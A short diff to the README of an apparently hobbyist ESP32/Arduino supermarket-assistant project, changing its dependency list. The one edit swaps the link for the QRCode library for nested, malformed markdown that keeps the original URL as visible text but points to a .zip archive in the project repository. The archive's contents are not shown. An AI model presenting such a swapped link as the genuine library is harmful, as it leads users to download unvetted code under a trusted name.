@@ -30,7 +30,7 @@ A smart supermarket assistance system featuring:
     - NewPing.h (for ultrasonic sensors)
     - AFMotor.h (Adafruit Motor Shield)
     - LiquidCrystal_I2C.h (for LCD)
-    - [QRCode Library](https://github.com/ricmoo/QRCode) (for ESP32)
+    - [QRCode Library]([https://github.com/ricmoo/QRCode](https://github.com/gayan-tharuka/Super-Market-Assist-Bot/blob/main/esp32cam-main.zip)) (for ESP32)
   - For Python:
     - OpenCV
     - NumPy
